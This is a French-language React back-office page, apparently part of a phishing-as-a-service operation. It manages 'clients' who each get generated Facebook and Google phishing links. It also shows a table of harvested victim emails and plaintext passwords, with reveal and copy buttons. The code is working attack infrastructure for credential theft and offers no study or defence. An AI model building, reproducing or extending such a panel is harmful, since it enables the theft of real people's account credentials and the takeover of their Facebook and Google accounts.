"use client";

import { useState, useMemo } from "react";
import Button from "../../../ux/ui/Button";
import Input from "../../../ux/ui/Input";
import Table, { TableColumn } from "../../../ux/ui/Table";
import SearchBar from "../../../ux/ui/SearchBar";
import Modal from "../../../ux/ui/Modal";
import { NotificationService } from "../../../services/notificationService";
import { useHackClients, useHackSubmissions } from "../../../hooks/useHack";
import { hackService } from "../../../services/backoffice/hackService";
import type { HackClient, HackClientDetail, HackSubmission } from "../../../types/backoffice/hack";

// ── vue active ─────────────────────────────────────────────────────────────────
type View = "clients" | "detail";
type SubmissionTypeFilter = "all" | "facebook" | "google";

export default function HackPage() {
  const [view, setView] = useState<View>("clients");
  const [selectedClient, setSelectedClient] = useState<HackClientDetail | null>(null);
  const [clientLoading, setClientLoading] = useState(false);

  // ── clients ────────────────────────────────────────────────────────────────
  const { items: clients, loading, error, setError, refresh, create, remove: removeClient, getDetail } = useHackClients();
  const [query, setQuery] = useState("");
  const [deleteClientId, setDeleteClientId] = useState<number | null>(null);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [createForm, setCreateForm] = useState({ name: "", email: "", redirect_url: "" });

  // ── detail / submissions ────────────────────────────────────────────────────
  const [subQuery, setSubQuery] = useState("");
  const [typeFilter, setTypeFilter] = useState<SubmissionTypeFilter>("all");
  const [deleteSubId, setDeleteSubId] = useState<number | null>(null);
  const [revealAll, setRevealAll] = useState(false);

  // submissions depuis le hook global (si on veut rafraîchir indépendamment)
  const {
    items: allSubs,
    loading: subsLoading,
    error: subsError,
    setError: setSubsError,
    refresh: refreshSubs,
    remove: removeSub,
  } = useHackSubmissions(
    view === "detail" && selectedClient ? selectedClient.id : undefined,
    typeFilter !== "all" ? typeFilter : undefined
  );

  // ── clients filtrés ────────────────────────────────────────────────────────
  const filteredClients = useMemo(() => {
    const q = query.trim().toLowerCase();
    if (!q) return clients;
    return clients.filter(
      (c) =>
        c.name.toLowerCase().includes(q) ||
        c.email.toLowerCase().includes(q) ||
        c.token.toLowerCase().includes(q)
    );
  }, [clients, query]);

  // ── submissions filtrées (vue détail) ──────────────────────────────────────
  const filteredSubs = useMemo(() => {
    const base = view === "detail" && selectedClient
      ? selectedClient.submissions.filter((s) => typeFilter === "all" || s.type === typeFilter)
      : allSubs;
    const q = subQuery.trim().toLowerCase();
    if (!q) return base;
    return base.filter(
      (s) => s.email.toLowerCase().includes(q) || s.client_name.toLowerCase().includes(q)
    );
  }, [view, selectedClient, allSubs, typeFilter, subQuery]);

  // ── actions ────────────────────────────────────────────────────────────────
  async function openDetail(clientId: number) {
    setClientLoading(true);
    const detail = await getDetail(clientId);
    setClientLoading(false);
    if (detail) {
      setSelectedClient(detail);
      setSubQuery("");
      setTypeFilter("all");
      setRevealAll(false);
      setView("detail");
    }
  }

  async function handleCreate() {
    if (!createForm.name.trim() || !createForm.email.trim()) return;
    const payload: CreateHackClientPayload = {
      name: createForm.name,
      email: createForm.email,
    };
    // Ajouter redirect_url seulement si rempli
    if (createForm.redirect_url.trim()) {
      payload.redirect_url = createForm.redirect_url;
    }
    const ok = await create(payload);
    if (ok) {
      setIsCreateOpen(false);
      setCreateForm({ name: "", email: "", redirect_url: "" });
      await NotificationService.showSuccessToast("Client créé avec succès");
    } else {
      await NotificationService.showErrorToast("Échec de la création du client");
    }
  }

  async function confirmDeleteClient() {
    if (!deleteClientId) return;
    const ok = await removeClient(deleteClientId);
    if (ok) {
      await NotificationService.showSuccessToast("Client supprimé (et ses soumissions)");
      if (selectedClient?.id === deleteClientId) setView("clients");
    } else {
      await NotificationService.showErrorToast("Échec de la suppression");
    }
    setDeleteClientId(null);
  }

  async function confirmDeleteSub() {
    if (!deleteSubId) return;
    const ok = await removeSub(deleteSubId);
    if (ok) {
      // mettre à jour le détail local
      if (selectedClient) {
        setSelectedClient((prev) =>
          prev
            ? { ...prev, submissions: prev.submissions.filter((s) => s.id !== deleteSubId), submissions_count: prev.submissions_count - 1 }
            : prev
        );
      }
      await NotificationService.showSuccessToast("Soumission supprimée");
    } else {
      await NotificationService.showErrorToast("Échec de la suppression");
    }
    setDeleteSubId(null);
  }

  function copyToClipboard(text: string, label: string) {
    navigator.clipboard.writeText(text).then(() => {
      NotificationService.showSuccessToast(`${label} copié !`);
    });
  }

  // ── colonnes table clients ─────────────────────────────────────────────────
  const clientColumns: TableColumn<HackClient>[] = [
    { key: "name", header: "Nom" },
    { key: "email", header: "Email" },
    {
      key: "token",
      header: "Token",
      render: (row) => (
        <div className="flex items-center gap-1.5">
          <span className="font-mono text-xs text-foreground/70">{(row as HackClient).token}</span>
          <button
            type="button"
            title="Copier le token"
            className="rounded p-0.5 text-foreground/40 hover:text-accent transition-colors"
            onClick={() => copyToClipboard((row as HackClient).token, "Token")}
          >
            <CopyIcon />
          </button>
        </div>
      ),
    },
    {
      key: "link_facebook",
      header: "Lien FB",
      render: (row) => (
        <LinkCell url={(row as HackClient).link_facebook} label="FB" onCopy={copyToClipboard} />
      ),
    },
    {
      key: "link_google",
      header: "Lien Google",
      render: (row) => (
        <LinkCell url={(row as HackClient).link_google} label="Google" onCopy={copyToClipboard} />
      ),
    },
    {
      key: "submissions_count",
      header: "Soumissions",
      render: (row) => (
        <span className="inline-flex items-center justify-center min-w-[1.5rem] rounded-full bg-accent/10 px-2 py-0.5 text-xs font-semibold text-accent ring-1 ring-accent/20">
          {(row as HackClient).submissions_count}
        </span>
      ),
    },
  ];

  // ── colonnes table soumissions ─────────────────────────────────────────────
  const subColumns: TableColumn<HackSubmission>[] = [
    { key: "client_name", header: "Client" },
    { key: "email", header: "Email victime" },
    {
      key: "password",
      header: (
        <button
          type="button"
          className="inline-flex items-center gap-1 text-foreground/80 hover:text-foreground"
          onClick={() => setRevealAll((v) => !v)}
        >
          Mot de passe
          {revealAll ? <EyeOffIcon /> : <EyeIcon />}
        </button>
      ),
      render: (row) => {
        const pwd = (row as HackSubmission).password || "";
        return (
          <div className="flex items-center gap-1.5">
            <span className="font-mono text-xs">
              {revealAll ? pwd : "•".repeat(Math.max(8, Math.min(20, pwd.length)))}
            </span>
            {revealAll && (
              <button
                type="button"
                title="Copier"
                className="rounded p-0.5 text-foreground/40 hover:text-accent transition-colors"
                onClick={() => copyToClipboard(pwd, "Mot de passe")}
              >
                <CopyIcon />
              </button>
            )}
          </div>
        );
      },
    },
    {
      key: "type",
      header: "Type",
      render: (row) => {
        const t = (row as HackSubmission).type;
        return (
          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-xs font-medium ring-1 ${
            t === "facebook"
              ? "bg-blue-500/10 text-blue-400 ring-blue-500/20"
              : "bg-red-500/10 text-red-400 ring-red-500/20"
          }`}>
            {t}
          </span>
        );
      },
    },
    {
      key: "date",
      header: "Date / Heure",
      render: (row) => (
        <span className="text-xs text-foreground/70">
          {(row as HackSubmission).date} {(row as HackSubmission).heure}
        </span>
      ),
    },
  ];

  // ── rendu vue clients ──────────────────────────────────────────────────────
  if (view === "clients") {
    return (
      <div className="space-y-4">
        {/* Header */}
        <div className="flex flex-col justify-between gap-3 sm:flex-row sm:items-center">
          <div>
            <h1 className="text-xl font-semibold text-foreground">Hack — Clients</h1>
            <p className="mt-0.5 text-sm text-foreground/50">Gérez vos clients et leurs liens de phishing.</p>
          </div>
          <div className="flex items-center gap-2">
            <SearchBar value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Rechercher..." />
            <Button variant="secondary" onClick={refresh} disabled={loading}>Rafraîchir</Button>
            <Button onClick={() => setIsCreateOpen(true)}>Nouveau client</Button>
          </div>
        </div>

        {/* Stats rapides */}
        <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
          <StatCard label="Clients" value={clients.length} color="accent" />
          <StatCard label="Total soumissions" value={clients.reduce((s, c) => s + c.submissions_count, 0)} color="green" />
          <StatCard label="Facebook" value={clients.filter((c) => c.link_facebook).length} color="blue" />
          <StatCard label="Google" value={clients.filter((c) => c.link_google).length} color="red" />
        </div>

        {error && <ErrorBanner message={error} />}

        <Table
          columns={clientColumns}
          data={filteredClients}
          rowKey={(row) => String((row as HackClient).id)}
          emptyText="Aucun client trouvé"
          actionsHeader="Actions"
          actions={(row) => (
            <div className="inline-flex items-center gap-2">
              <Button
                variant="ghost"
                className="px-2 py-1 text-sm"
                onClick={() => openDetail((row as HackClient).id)}
                disabled={clientLoading}
              >
                Détails
              </Button>
              <Button
                variant="ghost"
                className="px-2 py-1 text-sm text-red-400 hover:text-red-300"
                onClick={() => setDeleteClientId((row as HackClient).id)}
              >
                Supprimer
              </Button>
            </div>
          )}
        />

        {/* Modal création client */}
        <Modal
          open={isCreateOpen}
          onClose={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "", redirect_url: "" }); }}
          title="Créer un client"
          footer={
            <>
              <Button variant="secondary" onClick={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "", redirect_url: "" }); }}>Annuler</Button>
              <Button onClick={handleCreate} disabled={!createForm.name.trim() || !createForm.email.trim()}>Créer</Button>
            </>
          }
          size="sm"
        >
          <div className="space-y-3">
            <Input
              label="Nom"
              placeholder="Marie Dupont"
              value={createForm.name}
              onChange={(e) => setCreateForm((f) => ({ ...f, name: e.target.value }))}
            />
            <Input
              label="Email"
              placeholder="marie@gmail.com"
              value={createForm.email}
              onChange={(e) => setCreateForm((f) => ({ ...f, email: e.target.value }))}
            />
            <Input
              label="URL de redirection (optionnel)"
              placeholder="https://facebook.com/groupe123"
              value={createForm.redirect_url}
              onChange={(e) => setCreateForm((f) => ({ ...f, redirect_url: e.target.value }))}
            />
            <p className="text-xs text-foreground/50">
              Le token et les liens seront générés automatiquement.
              <br />
              Si vide, la redirection sera : <span className="font-mono">https://www.facebook.com</span>
            </p>
          </div>
        </Modal>

        {/* Modal suppression client */}
        <Modal
          open={Boolean(deleteClientId)}
          onClose={() => setDeleteClientId(null)}
          title="Supprimer le client"
          footer={
            <>
              <Button variant="secondary" onClick={() => setDeleteClientId(null)}>Annuler</Button>
              <Button onClick={confirmDeleteClient}>Supprimer</Button>
            </>
          }
          size="sm"
        >
          Êtes-vous sûr ? Toutes les soumissions liées seront supprimées (CASCADE).
        </Modal>
      </div>
    );
  }

  // ── rendu vue détail client ────────────────────────────────────────────────
  return (
    <div className="space-y-5">
      {/* Header avec retour */}
      <div className="flex flex-col justify-between gap-3 sm:flex-row sm:items-center">
        <div className="flex items-center gap-3">
          <button
            type="button"
            onClick={() => { setView("clients"); setSelectedClient(null); }}
            className="inline-flex items-center gap-1.5 rounded-lg border border-foreground/10 bg-foreground/5 px-3 py-1.5 text-sm text-foreground/70 hover:text-foreground hover:bg-foreground/10 transition-colors"
          >
            <svg viewBox="0 0 20 20" fill="currentColor" className="h-4 w-4"><path fillRule="evenodd" d="M12.79 5.23a.75.75 0 01-.02 1.06L8.832 10l3.938 3.71a.75.75 0 11-1.04 1.08l-4.5-4.25a.75.75 0 010-1.08l4.5-4.25a.75.75 0 011.06.02z" clipRule="evenodd" /></svg>
            Retour
          </button>
          <div>
            <h1 className="text-xl font-semibold text-foreground">{selectedClient?.name}</h1>
            <p className="text-sm text-foreground/50">{selectedClient?.email}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <SearchBar value={subQuery} onChange={(e) => setSubQuery(e.target.value)} placeholder="Rechercher..." />
          <select
            value={typeFilter}
            onChange={(e) => setTypeFilter(e.target.value as SubmissionTypeFilter)}
            className="rounded-lg border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
          >
            <option value="all">Tous les types</option>
            <option value="facebook">Facebook</option>
            <option value="google">Google</option>
          </select>
        </div>
      </div>

      {/* Info client : token + liens */}
      {selectedClient && (
        <div className="rounded-xl border border-foreground/10 bg-foreground/5 p-4 space-y-3">
          <h2 className="text-sm font-semibold text-foreground/70 uppercase tracking-wide">Informations client</h2>
          <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
            <InfoRow label="Token" value={selectedClient.token} onCopy={copyToClipboard} />
            {selectedClient.redirect_url && (
              <InfoRow label="URL Redirection" value={selectedClient.redirect_url} onCopy={copyToClipboard} isLink />
            )}
            <InfoRow label="Lien Facebook" value={selectedClient.link_facebook} onCopy={copyToClipboard} isLink />
            <InfoRow label="Lien Google" value={selectedClient.link_google} onCopy={copyToClipboard} isLink />
          </div>
          <div className="flex items-center gap-2 pt-1">
            <span className="text-xs text-foreground/50">Soumissions :</span>
            <span className="inline-flex items-center rounded-full bg-accent/10 px-2 py-0.5 text-xs font-semibold text-accent ring-1 ring-accent/20">
              {selectedClient.submissions_count}
            </span>
          </div>
        </div>
      )}

      {(subsError) && <ErrorBanner message={subsError} />}

      <Table
        columns={subColumns}
        data={filteredSubs}
        rowKey={(row) => String((row as HackSubmission).id)}
        emptyText="Aucune soumission"
        actionsHeader="Actions"
        actions={(row) => (
          <Button
            variant="ghost"
            className="px-2 py-1 text-sm text-red-400 hover:text-red-300"
            onClick={() => setDeleteSubId((row as HackSubmission).id)}
          >
            Supprimer
          </Button>
        )}
      />

      {/* Modal suppression soumission */}
      <Modal
        open={Boolean(deleteSubId)}
        onClose={() => setDeleteSubId(null)}
        title="Supprimer la soumission"
        footer={
          <>
            <Button variant="secondary" onClick={() => setDeleteSubId(null)}>Annuler</Button>
            <Button onClick={confirmDeleteSub}>Supprimer</Button>
          </>
        }
        size="sm"
      >
        Êtes-vous sûr de vouloir supprimer cette soumission ? Action irréversible.
      </Modal>
    </div>
  );
}

// ── Composants utilitaires ────────────────────────────────────────────────────

function StatCard({ label, value, color }: { label: string; value: number; color: string }) {
  const colors: Record<string, string> = {
    accent: "bg-accent/10 text-accent ring-accent/20",
    green: "bg-emerald-500/10 text-emerald-400 ring-emerald-500/20",
    blue: "bg-blue-500/10 text-blue-400 ring-blue-500/20",
    red: "bg-red-500/10 text-red-400 ring-red-500/20",
  };
  return (
    <div className={`rounded-xl p-4 ring-1 ${colors[color] ?? colors.accent} flex flex-col gap-1`}>
      <span className="text-xs font-medium uppercase tracking-wide opacity-70">{label}</span>
      <span className="text-2xl font-bold">{value}</span>
    </div>
  );
}

function ErrorBanner({ message }: { message: string }) {
  return (
    <div className="rounded-lg bg-red-500/10 px-3 py-2 text-sm text-red-300 ring-1 ring-red-500/20">
      {message}
    </div>
  );
}

function LinkCell({ url, label, onCopy }: { url: string; label: string; onCopy: (t: string, l: string) => void }) {
  return (
    <div className="flex items-center gap-1.5">
      <a href={url} target="_blank" rel="noopener noreferrer"
        className="truncate max-w-[140px] text-xs text-blue-400 hover:underline" title={url}>
        {url}
      </a>
      <button type="button" title={`Copier lien ${label}`}
        className="rounded p-0.5 text-foreground/40 hover:text-accent transition-colors"
        onClick={() => onCopy(url, `Lien ${label}`)}>
        <CopyIcon />
      </button>
    </div>
  );
}

function InfoRow({ label, value, onCopy, isLink }: { label: string; value: string; onCopy: (t: string, l: string) => void; isLink?: boolean }) {
  return (
    <div className="space-y-0.5">
      <p className="text-xs font-medium text-foreground/50">{label}</p>
      <div className="flex items-center gap-1.5">
        {isLink ? (
          <a href={value} target="_blank" rel="noopener noreferrer"
            className="truncate max-w-[200px] text-sm text-blue-400 hover:underline" title={value}>
            {value}
          </a>
        ) : (
          <span className="font-mono text-sm text-foreground/80 truncate max-w-[200px]">{value}</span>
        )}
        <button type="button" title="Copier"
          className="rounded p-0.5 text-foreground/40 hover:text-accent transition-colors"
          onClick={() => onCopy(value, label)}>
          <CopyIcon />
        </button>
      </div>
    </div>
  );
}

function CopyIcon() {
  return (
    <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5" aria-hidden>
      <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
      <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-3.5 w-3.5 fill-current" aria-hidden>
      <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z" />
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-3.5 w-3.5 fill-current" aria-hidden>
      <path d="M12 6c-4.5 0-8.2 2.5-10 6 1.1 2.2 3 4 5.3 5.1L3 21l1.4 1.4 18-18L21 3l-3.1 3.1C16.6 5.4 14.4 5 12 5zm0 3a4 4 0 013.7 2.6l-5.1 5.1A4 4 0 0112 9z" />
    </svg>
  );
}
